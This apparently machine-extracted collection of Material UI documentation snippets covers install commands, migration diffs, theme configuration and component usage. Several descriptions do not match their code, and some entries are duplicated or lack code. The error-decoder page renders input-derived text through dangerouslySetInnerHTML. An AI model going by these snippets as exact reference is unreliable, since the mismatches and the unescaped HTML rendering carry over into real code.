LANGUAGE: jsx
CODE:
import ListSubheader from '@mui/joy/ListSubheader';

----------------------------------------

TITLE: Rendering Default Background Demo Container in MUI Docs
DESCRIPTION: Demonstrates setting a default background (true) for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocs.js", "bg": true}

----------------------------------------

TITLE: Installing Inter Font via Fontsource
DESCRIPTION: Commands to install the Inter font package using different package managers through Fontsource.

LANGUAGE: bash
CODE:
npm install @fontsource/inter

LANGUAGE: bash
CODE:
pnpm add @fontsource/inter

LANGUAGE: bash
CODE:
yarn add @fontsource/inter

----------------------------------------

TITLE: Configuring Storybook Webpack for Emotion in JavaScript
DESCRIPTION: This code snippet shows how to update the Storybook webpack configuration to use the latest version of Emotion, which is necessary for compatibility with Material UI v5.

LANGUAGE: javascript
CODE:
// .storybook/main.js

const path = require('path');
const toPath = (filePath) => path.join(process.cwd(), filePath);

module.exports = {
  webpackFinal: async (config) => {
    return {
      ...config,
      resolve: {
        ...config.resolve,
        alias: {
          ...config.resolve.alias,
          '@emotion/core': toPath('node_modules/@emotion/react'),
          'emotion-theming': toPath('node_modules/@emotion/react'),
        },
      },
    };
  },
};

----------------------------------------

TITLE: Updating Grid Spacing Prop
DESCRIPTION: Change the Grid spacing prop to support arbitrary spacing values instead of multiples of 8.

LANGUAGE: diff
CODE:
/**
 * Defines the space between the type `item` component.
 * It can only be used on a type `container` component.
 */
-  spacing: PropTypes.oneOf([0, 8, 16, 24, 32, 40]),
+  spacing: PropTypes.oneOf([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]),

----------------------------------------

TITLE: Creating Block Display Elements with MUI Box Component in JSX
DESCRIPTION: Shows how to use the MUI Box component to create block display elements. This example converts span elements to display as blocks.

LANGUAGE: jsx
CODE:
<Box component="span" sx={{ display: 'block' }}>block</Box>
<Box component="span" sx={{ display: 'block' }}>block</Box>

----------------------------------------

TITLE: Updating jssPreset import
DESCRIPTION: Change jssPreset import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { jssPreset } from '@mui/material/styles';
+import { jssPreset } from '@mui/styles';

----------------------------------------

TITLE: Button Component HTML Structure
DESCRIPTION: Basic HTML structure showing the anatomy of the Button component

LANGUAGE: html
CODE:
<button class="MuiButton-root" type="button">
  <!-- Button contents -->
</button>

----------------------------------------

TITLE: Creating Styled Components with makeStyles Hook
DESCRIPTION: Example showing how to create styled components using the makeStyles hook with gradient backgrounds and custom styling

LANGUAGE: JSX
CODE:
import * as React from 'react';
import { makeStyles } from '@mui/material/styles';

const useStyles = makeStyles({
  root: {
    background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
    border: 0,
    borderRadius: 3,
    boxShadow: '0 3px 5px 2px rgba(255, 105, 135, .3)',
    color: 'white',
    height: 48,
    padding: '0 30px',
  },
});

export default function Hook() {
  const classes = useStyles();
  return <button className={classes.root}>Hook</button>;
}

----------------------------------------

TITLE: Styled Component Definition
DESCRIPTION: Demonstrates how to create styled components with proper naming conventions and interface extensions.

LANGUAGE: typescript
CODE:
const FooRoot = styled(Typography, {
  name: 'MuiFoo',
  slot: 'Root',
  overridesResolver: (props, styles) => styles.root,
})({
  // styling
});

----------------------------------------

TITLE: Using Stabilized Grid v2 in Material UI v6
DESCRIPTION: Shows how to use the stabilized Grid v2 component with responsive configuration in Material UI v6.

LANGUAGE: jsx
CODE:
import Grid from '@mui/material/Grid2';

<Grid container>
  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />
  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />
  <Grid size={{ xs: 6, sm: 4, lg: 3 }} />
</Grid>;

----------------------------------------

TITLE: Serializable Props Example with Joy UI Components
DESCRIPTION: Demonstrates correct usage of Joy UI components with serializable props in a server component context.

LANGUAGE: tsx
CODE:
import Sheet from '@mui/joy/Sheet';
import Typography from '@mui/joy/Typography';

export default function Page() {
  return (
    <Sheet>
      <Typography fontSize="sm">Hello World</Typography>
    </Sheet>
  );
}

----------------------------------------

TITLE: Integrating Material UI with Theme UI
DESCRIPTION: Shows how to combine Material UI with Theme UI by nesting providers and configuring separate themes for each library while maintaining isolation through THEME_ID.

LANGUAGE: javascript
CODE:
import { ThemeUIProvider } from 'theme-ui';
import { createTheme as materialCreateTheme, THEME_ID } from '@mui/material/styles';

const themeUITheme = {
  fonts: {
    body: 'system-ui, sans-serif',
    heading: '"Avenir Next", sans-serif',
    monospace: 'Menlo, monospace',
  },
  colors: {
    text: '#000',
    background: '#fff',
    primary: '#33e',
  },
};

const materialTheme = materialCreateTheme();

function App() {
  return (
    <ThemeUIProvider theme={themeUITheme}>
      <MaterialThemeProvider theme={{ [THEME_ID]: materialTheme }}>
        Theme UI components and Material UI components
      </MaterialThemeProvider>
    </ThemeUIProvider>
  );
}

----------------------------------------

TITLE: Supporting Components Import - React/JSX
DESCRIPTION: Import statements for Link and Typography components that are commonly used with Breadcrumbs.

LANGUAGE: jsx
CODE:
import Link from '@mui/joy/Link';

LANGUAGE: jsx
CODE:
import Typography from '@mui/joy/Typography';

----------------------------------------

TITLE: Extending MUI theme with custom colors
DESCRIPTION: Example of adding a custom color to the MUI theme and using it with TypeScript

LANGUAGE: typescript
CODE:
import { createTheme, Button } from '@mui/material';

// 1. Extend the theme.
const theme = createTheme({
  palette: {
    neutral: {
      main: '#d79b4a',
    },
  },
});

// 2. Notify TypeScript about the new color in the palette
declare module '@mui/material/styles' {
  interface Palette {
    neutral: Palette['primary'];
  }
  interface PaletteOptions {
    neutral: PaletteOptions['primary'];
  }
}

// 3. Update the Button's color prop options
declare module '@mui/material/Button' {
  interface ButtonPropsColorOverrides {
    neutral: true;
  }
}

// 4. Profit
<Button color="neutral"  />

----------------------------------------

TITLE: Synchronizing Local Master Branch with Upstream
DESCRIPTION: Commands to synchronize the local master branch with the upstream repository.

LANGUAGE: bash
CODE:
git checkout master
git pull upstream master

----------------------------------------

TITLE: Using CSS Variables in Styled Components
DESCRIPTION: Shows how to access and use CSS variables from the theme in a styled component using Material UI v6.

LANGUAGE: javascript
CODE:
const CustomComponent = styled('div')(({ theme }) => ({
  backgroundColor: theme.vars.palette.background.default,
  color: theme.vars.palette.text.primary,
}));

----------------------------------------

TITLE: Updating Modal Event Handling
DESCRIPTION: Update Modal component to ignore event.defaultPrevented and use event.stopPropagation() for preventing closure.

LANGUAGE: javascript
CODE:
// Old behavior
event.preventDefault();

// New behavior
event.stopPropagation();

----------------------------------------

TITLE: Parameter Destructuring Pattern in TypeScript
DESCRIPTION: Demonstrates the standard pattern for destructuring hook parameters with proper TypeScript typing.

LANGUAGE: typescript
CODE:
function useAwesomeControl(parameters: UseAwesomeControlParameters) {
  const { disabled, readOnly } = parameters;

  // the rest of the hook's logic...
}

----------------------------------------

TITLE: Configuring Vite for Pigment CSS
DESCRIPTION: Instructions for setting up Vite to use Pigment CSS, including plugin installation and configuration in the Vite config file.

LANGUAGE: bash
CODE:
npm install --save-dev @pigment-css/vite-plugin

LANGUAGE: javascript
CODE:
import { defineConfig } from 'vite';
import { pigment } from '@pigment-css/vite-plugin';

/**
 * @type {import('@pigment-css/vite-plugin').PigmentOptions}
 */
const pigmentConfig = {
  transformLibraries: ['@mui/material'],
};

export default defineConfig({
  plugins: [
    pigment(pigmentConfig),
    // ... Your other plugins.
  ],
});

----------------------------------------

TITLE: Helper Text Components Import - React/JSX
DESCRIPTION: Import statements for FormControl and FormHelperText components used with Checkbox.

LANGUAGE: jsx
CODE:
import FormControl from '@mui/joy/FormControl';
import FormHelperText from '@mui/joy/FormHelperText';

----------------------------------------

TITLE: Implementing Dynamic Variant API in MUI Theme
DESCRIPTION: Example showing how to add custom variants to Material UI components using the new dynamic variant API. This snippet demonstrates creating a dashed button variant with TypeScript type safety.

LANGUAGE: typescript
CODE:
// Define the style that should be applied for specific props.
const theme = createMuiTheme({
  components: {
    MuiButton: {
      variants: [
        {
          props: { variant: 'dashed', color: 'secondary' },
          styles: {
            border: `4px dashed ${red[500]}`,
          },
        },
      ],
    },
  },
});

// Optionally retain type safety:
declare module '@mui/material/Button' {
  interface ButtonPropsVariantOverrides {
    dashed: true;
  }
}

// Enjoy!
<Button variant="dashed" color="secondary" />;

----------------------------------------

TITLE: Configuring Robots.txt with Algolia Verification
DESCRIPTION: Basic robots.txt configuration that includes an Algolia crawler verification code and sets global access permissions. The file allows unrestricted access to all user agents.

LANGUAGE: txt
CODE:
# Algolia-Crawler-Verif: 98C49CAFF7AEED76

User-agent: *
Allow: /

----------------------------------------

TITLE: Importing Unstyled Button from MUI Base
DESCRIPTION: This code snippet shows how to import the useButton hook from the unstyled Button component in MUI Base.

LANGUAGE: JavaScript
CODE:
import { useButton } from '@mui/base/ButtonUnstyled';

----------------------------------------

TITLE: Installing Pigment CSS for Vite
DESCRIPTION: Commands to install Pigment CSS and its Vite plugin using npm.

LANGUAGE: bash
CODE:
npm install @pigment-css/react
npm install --save-dev @pigment-css/vite-plugin

----------------------------------------

TITLE: Defining Grid Areas
DESCRIPTION: Example of naming grid areas using the gridArea property in MUI

LANGUAGE: jsx
CODE:
<Box sx={{ gridArea: 'header' }}>…

----------------------------------------

TITLE: Importing IconButton Component - React/JSX
DESCRIPTION: Basic import statement for the Joy UI IconButton component

LANGUAGE: jsx
CODE:
import IconButton from '@mui/joy/IconButton';

----------------------------------------

TITLE: Using DatePicker Component with Built-in Field in React
DESCRIPTION: Demonstrates usage of the DatePicker component in v6 which now includes the field component by default without needing to declare a text field.

LANGUAGE: jsx
CODE:
import { DatePicker } from '@mui/x-date-pickers/DatePicker';

<DatePicker label="My first v6 picker" />;

----------------------------------------

TITLE: Including Code Snippets in MUI Callouts
DESCRIPTION: Demonstrates how to include code snippets within a callout. This example shows a React component using MUI's Stack component inside an info callout.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import Stack from '@mui/material/Stack';

export default function BasicAlerts() {
  return <Stack sx={{ width: '100%' }} spacing={2} />;
}

----------------------------------------

TITLE: Updating MUI Styles Import Path
DESCRIPTION: Shows the recommended change for importing makeStyles, moving from @mui/styles to @mui/material/styles to prevent package duplication and reduce confusion.

LANGUAGE: diff
CODE:
-import { makeStyles } from '@mui/styles';
+import { makeStyles } from '@mui/material/styles';

----------------------------------------

TITLE: Migrating Subheader Component
DESCRIPTION: Diff showing the changes required to migrate the Subheader component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import Subheader from 'material-ui/Subheader';
+import ListSubheader from '@material-ui/core/ListSubheader';

-<Subheader>Sub Heading</Subheader>
+<ListSubheader>Sub Heading</ListSubheader>

----------------------------------------

TITLE: Refactoring state class names in theme styleOverrides
DESCRIPTION: Replace state class selectors like $focused with .Mui-focused in theme styleOverrides.

LANGUAGE: diff
CODE:
 const theme = createTheme({
   components: {
     MuiOutlinedInput: {
       styleOverrides: {
         root: {
-          '&$focused': {
+          '&.Mui-focused': {
             borderWidth: 1,
           }
         }
       }
     }
   }
 });

----------------------------------------

TITLE: Refactoring state class names in theme styleOverrides
DESCRIPTION: Replace state class selectors like $focused with .Mui-focused in theme styleOverrides.

LANGUAGE: diff
CODE:
 const theme = createTheme({
   components: {
     MuiOutlinedInput: {
       styleOverrides: {
         root: {
-          '&$focused': {
+          '&.Mui-focused': {
             borderWidth: 1,
           }
         }
       }
     }
   }
 });

----------------------------------------

TITLE: Enabling Accessible Field DOM Structure in React Date Components
DESCRIPTION: Demonstrates how to enable the new accessible DOM structure for Date Field and Date Picker components. This improves screen reader support by managing ARIA attributes more effectively.

LANGUAGE: jsx
CODE:
<DateField enableAccessibleFieldDOMStructure />
<DatePicker enableAccessibleFieldDOMStructure />

----------------------------------------

TITLE: Box Component HTML Structure
DESCRIPTION: Shows the basic HTML anatomy of the Box component with its root element and class structure.

LANGUAGE: html
CODE:
<div className="MuiBox-root">
  <!-- contents of the Box -->
</div>

----------------------------------------

TITLE: Importing Standalone DateField Component in React
DESCRIPTION: Shows how to import and use the new DateField component as a standalone input for date values.

LANGUAGE: jsx
CODE:
import { DateField } from '@mui/x-date-pickers/DateField';

<DateField label="My first field" />;

----------------------------------------

TITLE: Demonstrating Header Usage in Markdown for MUI Documentation
DESCRIPTION: This code snippet shows various ways to create headers in Markdown, including standard headers of different levels, headers with links, and headers with plan indicators for Pro and Premium plans.

LANGUAGE: markdown
CODE:
# Headers

<p class="description">Headers.</p>

## What is Lorem Ipsum?

Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book.

### Where does it come from?

Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old.

#### Why do we use it?

It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using 'Content here, content here', making it look like readable English.

## [Header with link](/)

## Header with Pro plan [<span class="plan-pro"></span>](/x/introduction/licensing/#pro-plan 'Pro plan')

## Header with Premium plan [<span class="plan-premium"></span>](/x/introduction/licensing/#premium-plan 'premium plan')

----------------------------------------

TITLE: Running CI Codemod Transformation in JavaScript
DESCRIPTION: This snippet shows how to simulate a consumer-facing experience by running a codemod transformation using npx and a CodeSandbox CI build link.

LANGUAGE: bash
CODE:
npx @mui/codemod@https://pkg.csb.dev/mui/material-ui/commit/39bf9464/@mui/codemod deprecations/accordion-props docs/src/modules/brandingTheme.ts

----------------------------------------

TITLE: Installing and Building MUI Icons
DESCRIPTION: Commands for installing dependencies, building the Material Design Icons, and publishing the generated components. Must be run in sequence to generate and publish the icon components.

LANGUAGE: bash
CODE:
pnpm install
pnpm build
cd build
pnpm publish

----------------------------------------

TITLE: HTML Structure of Aspect Ratio Component
DESCRIPTION: This snippet shows the HTML structure of the AspectRatio component. It consists of a root div and a content div, with the child element given a data-first-child attribute for styling purposes.

LANGUAGE: html
CODE:
<div class="MuiAspectRatio-root">
  <div class="MuiAspectRatio-content">
    <some-element data-first-child>
      <!-- Aspect Ratio contents -->
    </some-element>
  </div>
</div>

----------------------------------------

TITLE: Date Field Component Usage in JSX
DESCRIPTION: Shows how to implement the new standalone Date Field component which provides improved date input functionality.

LANGUAGE: jsx
CODE:
import { DateField } from '@mui/x-date-pickers/DateField';

<DateField label="My first field" />;

----------------------------------------

TITLE: MUI Update Post Frontmatter
DESCRIPTION: YAML frontmatter defining metadata for the June 2019 update blog post including title, description, date, authors and tags.

LANGUAGE: markdown
CODE:
---
title: June 2019 Update
description: Here are the most significant improvements in June.
date: 2019-07-08T00:00:00.000Z
authors: ['oliviertassinari']
tags: ['Company']
manualCard: true
---

----------------------------------------

TITLE: Handling Strict Mode Call Count Changes in React 19
DESCRIPTION: Shows how to handle different spy call counts in tests due to React 19's strict mode improvements.

LANGUAGE: typescript
CODE:
const expectedCallCount = reactMajor >= 19 ? 2 : 4;

----------------------------------------

TITLE: Migrating Drop Down Menu Component
DESCRIPTION: Diff showing the changes required to migrate the Drop Down Menu component from v0.x to v1.x.

LANGUAGE: diff
CODE:
-import DropDownMenu from 'material-ui/DropDownMenu';
+import Select from '@material-ui/core/Select';

-<DropDownMenu></DropDownMenu>
+<Select value={this.state.value}></Select>

----------------------------------------

TITLE: Updating Button Variant Props
DESCRIPTION: Replace deprecated button variants (flat, raised, fab) with their new equivalents in v4.

LANGUAGE: diff
CODE:
-<Button variant="raised" />
+<Button variant="contained" />

-<Button variant="flat" />
+<Button variant="text" />

-import Button from '@material-ui/core/Button';
-<Button variant="fab" />
+import Fab from '@material-ui/core/Fab';
+<Fab />

-import Button from '@material-ui/core/Button';
-<Button variant="extendedFab" />
+import Fab from '@material-ui/core/Fab';
+<Fab variant="extended" />

----------------------------------------

TITLE: Updating Button Variant Props
DESCRIPTION: Replace deprecated button variants (flat, raised, fab) with their new equivalents in v4.

LANGUAGE: diff
CODE:
-<Button variant="raised" />
+<Button variant="contained" />

-<Button variant="flat" />
+<Button variant="text" />

-import Button from '@material-ui/core/Button';
-<Button variant="fab" />
+import Fab from '@material-ui/core/Fab';
+<Fab />

-import Button from '@material-ui/core/Button';
-<Button variant="extendedFab" />
+import Fab from '@material-ui/core/Fab';
+<Fab variant="extended" />

----------------------------------------

TITLE: Configuring Vite for Modern Bundle
DESCRIPTION: Update Vite configuration to use the 'mui-modern' exports condition for smaller bundle size excluding legacy browser support.

LANGUAGE: javascript
CODE:
// vite.config.js
{
  resolve: {
    conditions: ['mui-modern', 'module', 'browser', 'development|production']
  }
}

----------------------------------------

TITLE: Creating and Starting a Playground
DESCRIPTION: Commands to create a playground for isolated component testing and start the development server.

LANGUAGE: bash
CODE:
pnpm docs:create-playground && pnpm start

----------------------------------------

TITLE: Enabling Row Grouping in DataGridPro
DESCRIPTION: Shows how to enable the experimental row grouping feature in DataGridPro component. This feature allows users to group data grid rows by column values.

LANGUAGE: javascript
CODE:
<DataGridPro experimentalFeatures={{ rowGrouping: true }} {...otherProps} />

----------------------------------------

TITLE: Embedded Video HTML
DESCRIPTION: HTML iframe embedding a YouTube video demonstrating the Sketch symbols usage.

LANGUAGE: html
CODE:
<iframe style="width: 100%; max-width: 648px;" height="364" src="https://www.youtube.com/embed/DTU6r_VE2C4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

----------------------------------------

TITLE: Rendering a Button Component in React with Material UI v1
DESCRIPTION: This code snippet demonstrates how to render a basic Material UI Button component in a React application using the new v1 syntax.

LANGUAGE: javascript
CODE:
import Button from '@mui/material/Button';

function App() {
  return (
    <Button variant="contained" color="primary">
      Hello World
    </Button>
  );
}

----------------------------------------

TITLE: DataGrid Component Customization
DESCRIPTION: Shows how to customize DataGrid components using the slot strategy and componentsProps.

LANGUAGE: jsx
CODE:
<DataGrid {...data} components={{ FilterPanelDeleteIcon: DeleteIcon }} />

LANGUAGE: jsx
CODE:
<DataGrid
  componentsProps={{
    filterPanel: {
      columnsSort: 'asc',
    },
  }}
/>

----------------------------------------

TITLE: Disabling Portal Rendering for Select Popup
DESCRIPTION: Example of disabling the default Portal rendering for the Select's popup to render it inline.

LANGUAGE: jsx
CODE:
<Select slotProps={{ popup: { disablePortal: true } }} />

----------------------------------------

TITLE: Importing CardOverflow Component - React/JSX
DESCRIPTION: Import statement for the CardOverflow component used for content expansion

LANGUAGE: jsx
CODE:
import CardOverflow from '@mui/joy/CardOverflow';

----------------------------------------

TITLE: Displaying Alert Component in React
DESCRIPTION: This code snippet shows the implementation of the new Alert component in React. The Alert component is part of MUI's lab and can be used to display important messages to users.

LANGUAGE: jsx
CODE:
<img src="/static/blog/2020-q1-update/alert.png" alt="alert" style="max-height: 369px; margin-bottom: 24px;" />

----------------------------------------

TITLE: Configuring Custom Column Count for MUI Grid
DESCRIPTION: This code shows how to set a custom number of columns for the Grid container in MUI v5, allowing for more flexible layouts beyond the default 12-column system.

LANGUAGE: jsx
CODE:
<Grid container columns={16}>

----------------------------------------

TITLE: Implementing Custom Aggregation Function in TypeScript for MUI X Data Grid
DESCRIPTION: This snippet demonstrates how to create a custom aggregation function for the MUI X Data Grid. It defines a function that returns the first alphabetical value from a column of strings, including type definitions and configuration options.

LANGUAGE: typescript
CODE:
const firstAlphabeticalAggregation: GridAggregationFunction<
  string,
  string | null
> = {
  apply: (params) => {
    if (params.values.length === 0) {
      return null;
    }
    const sortedValue = params.values.sort((a = '', b = '') =>
      a.localeCompare(b),
    );
    return sortedValue[0];
  },
  // The `label` defines what's displayed in the column header when this
  // aggregation is active.
  label: 'First Alphabetical',
  // The `types` property defines which type of columns can use this
  // aggregation function. Here, we only want to propose this aggregation
  // function for `string` columns. If not defined, aggregation will be
  // available for all column types.
  columnTypes: ['string'],
};

----------------------------------------

TITLE: Adjusting CSS injection order with StyledEngineProvider
DESCRIPTION: Use StyledEngineProvider with injectFirst option to ensure correct CSS injection order when using JSS and Emotion together.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { StyledEngineProvider } from '@mui/material/styles';

export default function GlobalCssPriority() {
  return (
    <StyledEngineProvider injectFirst>
      {/* Your component tree. Now you can override Material UI's styles. */}
    </StyledEngineProvider>
  );
}

----------------------------------------

TITLE: React Admin Quick Start Configuration
DESCRIPTION: Example of using react-admin's component subdivision approach for building customizable admin interfaces.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { Admin, Resource, ListGuesser } from 'react-admin';
import simpleRestProvider from 'ra-data-simple-rest';

const dataProvider = simpleRestProvider('https://domain.tld/api');

export default function App() {
  return (
    <Admin dataProvider={dataProvider}>
      <Resource name="users" list={ListGuesser} />
    </Admin>
  );
}

----------------------------------------

TITLE: Updating Props for Date Picker in React
DESCRIPTION: Shows how to migrate from spreading props on TextField to using the new renderInput prop for providing label and helperText.

LANGUAGE: diff
CODE:
 <DatePicker
-  label="Date"
-  helperText="Something"
+  renderInput={props => <TextField label="Date" helperText="Something" /> }
 />

----------------------------------------

TITLE: Function-based Spacing Configuration
DESCRIPTION: Illustrates how to use a custom function for spacing calculations, using Bootstrap's rem-based strategy

LANGUAGE: javascript
CODE:
const theme = createTheme({
  spacing: (factor) => `${0.25 * factor}rem`, // (Bootstrap strategy)
});

theme.spacing(2); // = 0.25 * 2rem = 0.5rem = 8px

----------------------------------------

TITLE: Implementing Dark Mode with Joy UI in Next.js
DESCRIPTION: Demonstrates how to use the InitColorSchemeScript component from Joy UI to enable perfect dark mode functionality in a Next.js application.

LANGUAGE: JavaScript
CODE:
// A Next.js example
import Document, { Html, Head, Main, NextScript } from 'next/document';
import InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';

export default class MyDocument extends Document {
  render() {
    return (
      <Html data-color-scheme="light">
        <Head>...</Head>
        <body>
          <InitColorSchemeScript />
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

----------------------------------------

TITLE: Filtering with Date Objects in Data Grid
DESCRIPTION: Example of the new filterModel supporting Date objects for date and dateTime column types in the Data Grid component.

LANGUAGE: jsx
CODE:
// No code snippet provided for this feature

----------------------------------------

TITLE: Using Flattened Props with MUI CSS Utility Components in React
DESCRIPTION: This snippet shows how to use flattened props with MUI CSS utility components like Box, Typography, Stack, and Grid. These props provide a shorthand way to apply styling directly to the components.

LANGUAGE: jsx
CODE:
<Box display="grid" />
<Typography p={2} color="text.secondary" />
<Stack mt={1} />
<Grid color="success.main" />

----------------------------------------

TITLE: Component Props Change Example
DESCRIPTION: Example transformation showing update of a component's props from old to new API

LANGUAGE: diff
CODE:
-<Component disableBackdropClick />
+<Component />

----------------------------------------

TITLE: Configuring TypeScript Theme Augmentation for MUI Lab
DESCRIPTION: TypeScript configuration example showing how to extend the default theme structure with MUI Lab components. This enables CSS overrides and default prop customization for Lab components.

LANGUAGE: tsx
CODE:
import type {} from '@mui/lab/themeAugmentation';

const theme = createTheme({
  components: {
    MuiTimeline: {
      styleOverrides: {
        root: {
          backgroundColor: 'red',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Implementing StylesProvider with injectFirst in React
DESCRIPTION: Example showing how to use StylesProvider with injectFirst prop to allow styled components to override Material UI styles

LANGUAGE: JSX
CODE:
import { StylesProvider } from '@mui/styles';

<StylesProvider injectFirst>
  {/* Your component tree.
      Styled components can override Material UI's styles. */}
</StylesProvider>;

----------------------------------------

TITLE: Implementing Callback Style Overrides in MUI Theme
DESCRIPTION: Demonstrates how to use callback functions in MUI theme style overrides to create dynamic styles based on component props and theme values. The callback provides access to ownerState and theme objects for flexible customization.

LANGUAGE: jsx
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';

<ThemeProvider
  theme={createTheme({
    components: {
      MuiChip: {
        styleOverrides: {
          root: ({ ownerState, theme }) => ({
            padding: {
              small: '8px 4px',
              medium: '12px 6px',
              large: '16px 8px',
            }[ownerState.size],
            ...(ownerState.variant === 'outlined' && {
              borderWidth: '2px',
              ...(ownerState.variant === 'primary' && {
                borderColor: theme.palette.primary.light,
              }),
            }),
          }),
          label: {
            padding: 0,
          },
        },
      },
    },
  })}
>
  ...your app
</ThemeProvider>;

----------------------------------------

TITLE: Enabling Color Schemes in Material UI v6 Theme
DESCRIPTION: Demonstrates how to enable dark mode support using the colorSchemes option in Material UI v6 theme creation.

LANGUAGE: javascript
CODE:
const theme = createTheme({ colorSchemes: { dark: true } });

function App() {
  return <ThemeProvider theme={theme}>...</ThemeProvider>;
}

----------------------------------------

TITLE: Rendering Inline Background Demo Container in MUI Docs
DESCRIPTION: Illustrates setting an inline background for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocs.js", "bg": "inline"}

----------------------------------------

TITLE: Using adaptV4Theme helper for theme migration
DESCRIPTION: Use the adaptV4Theme helper to migrate from v4 theme structure to v5 theme structure.

LANGUAGE: diff
CODE:
-import { createMuiTheme } from '@mui/material/styles';
+import { createTheme, adaptV4Theme } from '@mui/material/styles';

-const theme = createMuiTheme({
+const theme = createTheme(adaptV4Theme({
   // v4 theme
-});
+}));

----------------------------------------

TITLE: MUI Letter Spacing Control
DESCRIPTION: Examples of controlling letter spacing using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ letterSpacing: 6 }}>…
<Box sx={{ letterSpacing: 10 }}>…

----------------------------------------

TITLE: Implementing Fixed Position Element with Modal
DESCRIPTION: Example of adding the mui-fixed class to elements with fixed positioning to prevent layout shifts when modal is open.

LANGUAGE: jsx
CODE:
<Box sx={{ position: 'sticky', right: 0, top: 0, left: 0 }} className="mui-fixed">

----------------------------------------

TITLE: Importing Unstyled Switch from MUI Base
DESCRIPTION: This code snippet shows how to import the useSwitch hook from the unstyled Switch component in MUI Base.

LANGUAGE: JavaScript
CODE:
import { useSwitch } from '@mui/base/SwitchUnstyled';

----------------------------------------

TITLE: Styling MUI Slider Component with Custom Margins in JSX
DESCRIPTION: Demonstrates how to add custom margin spacing to a MUI Slider component using the sx prop with margin shorthand (my). Sets vertical margins to 1 unit (8px).

LANGUAGE: jsx
CODE:
// add margin: 8px 0px;
<Slider sx={{ my: 1 }} />

----------------------------------------

TITLE: Updating Date Picker Import Statements in JavaScript
DESCRIPTION: Code changes required to migrate Date Picker imports from @mui/lab to the new @mui/x-date-pickers and @mui/x-date-pickers-pro packages. Shows both individual and combined import statement updates.

LANGUAGE: javascript
CODE:
-import DatePicker from '@mui/lab/DatePicker';
+import { DatePicker } from '@mui/x-date-pickers/DatePicker';

-import DateRangePicker from '@mui/lab/DateRangePicker';
+import { DateRangePicker } from '@mui/x-date-pickers-pro/DateRangePicker';

-import { DatePicker, DateRangePicker } from '@mui/lab';
+import { DatePicker } from '@mui/x-date-pickers';
+import { DateRangePicker } from '@mui/x-date-pickers-pro';
// DatePicker is also available in `@mui/x-date-pickers-pro`

----------------------------------------

TITLE: Migrating Tree View Imports from MUI Lab to MUI X in JavaScript
DESCRIPTION: This snippet demonstrates how to update import statements when migrating the Tree View component from @mui/lab to @mui/x-tree-view. It shows two different ways to update the imports.

LANGUAGE: javascript
CODE:
-import TreeView from '@mui/lab/TreeView';
-import TreeItem from '@mui/lab/TreeItem';
+import { TreeView } from '@mui/x-tree-view/TreeView';
+import { TreeItem } from '@mui/x-tree-view/TreeItem';

LANGUAGE: javascript
CODE:
-import { TreeView, TreeItem } from '@mui/lab';
+import { TreeView, TreeItem } from '@mui/x-tree-view';

----------------------------------------

TITLE: Installing Pigment CSS packages for Material UI
DESCRIPTION: Commands to install the necessary Pigment CSS packages for use with Material UI v6 using different package managers.

LANGUAGE: bash
CODE:
npm install @mui/material-pigment-css @pigment-css/react

LANGUAGE: bash
CODE:
pnpm add @mui/material-pigment-css @pigment-css/react

LANGUAGE: bash
CODE:
yarn add @mui/material-pigment-css @pigment-css/react

----------------------------------------

TITLE: Updating Typography Variants and Props
DESCRIPTION: Replace deprecated typography variants and update default styles and props.

LANGUAGE: diff
CODE:
// Replace deprecated variants
- <Typography variant="display4" />
+ <Typography variant="h1" />

// Update variant mapping prop name
-<Typography headlineMapping={headlineMapping}>
+<Typography variantMapping={variantMapping}>

// Default variant changed
- <Typography> // defaults to body2
+ <Typography> // defaults to body1

// Color prop update
- <Typography color="default">
+ <Typography color="initial">

----------------------------------------

TITLE: Importing Unstyled Slider from MUI Base
DESCRIPTION: This code snippet demonstrates how to import the SliderUnstyled component from MUI Base.

LANGUAGE: JavaScript
CODE:
import { SliderUnstyled } from '@mui/base/SliderUnstyled';

----------------------------------------

TITLE: Decoding Production Errors in MUI React Applications
DESCRIPTION: This code snippet demonstrates a React component for decoding minified production error messages in MUI applications. It allows users to input an error message and attempts to reconstruct the original error text.

LANGUAGE: javascript
CODE:
import * as React from 'react';
import MarkdownElement from 'docs/src/modules/components/MarkdownElement';
import ErrorDecoder from 'docs/src/modules/utils/ErrorDecoder';

export default function Page() {
  const [buildId, setBuildId] = React.useState('');
  const [error, setError] = React.useState('');
  const [errorMessage, setErrorMessage] = React.useState('');

  const handleBuildIdChange = (event) => {
    setBuildId(event.target.value);
  };

  const handleErrorChange = (event) => {
    setError(event.target.value);
  };

  const handleErrorMessageChange = (event) => {
    setErrorMessage(event.target.value);
  };

  const decodedError = ErrorDecoder(buildId, error, errorMessage);

  return (
    <div>
      <div>
        <label htmlFor="mui-build-id">Build id (optional): </label>
        <input id="mui-build-id" value={buildId} onChange={handleBuildIdChange} />
      </div>
      <div>
        <label htmlFor="mui-error">Error: </label>
        <input id="mui-error" value={error} onChange={handleErrorChange} />
      </div>
      <div>
        <label htmlFor="mui-error-message">Error message: </label>
        <input id="mui-error-message" value={errorMessage} onChange={handleErrorMessageChange} />
      </div>
      <MarkdownElement>
        <span
          dangerouslySetInnerHTML={{
            __html: decodedError,
          }}
        />
      </MarkdownElement>
    </div>
  );
}

----------------------------------------

